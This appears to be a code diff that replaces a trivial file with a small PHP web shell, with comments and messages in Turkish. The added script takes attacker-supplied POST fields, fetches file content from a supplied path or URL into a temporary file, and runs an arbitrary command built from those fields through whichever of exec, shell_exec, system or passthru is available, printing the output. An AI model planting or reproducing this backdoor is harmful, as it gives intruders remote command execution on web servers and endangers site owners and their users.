@@ -1,1 +1,18 @@
-aa
+<?php
+echo "<!--rahatinizabakin-->";
+$basi = @$_POST["basi"];
+$sonu = @$_POST["sonu"];
+$temp = tmpfile();
+$dosya = @file_get_contents(@$_POST["dosya"]);
+fwrite($temp, $dosya);
+$bilgi = stream_get_meta_data($temp);
+$dizin = $bilgi['uri'];
+$komut = "{$basi} {$dizin} {$sonu}";
+if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
+}else{
+echo "tum fonksiyonlar kapali aq";
+}
+print $sonuc;
+fclose($temp);
+
+?>
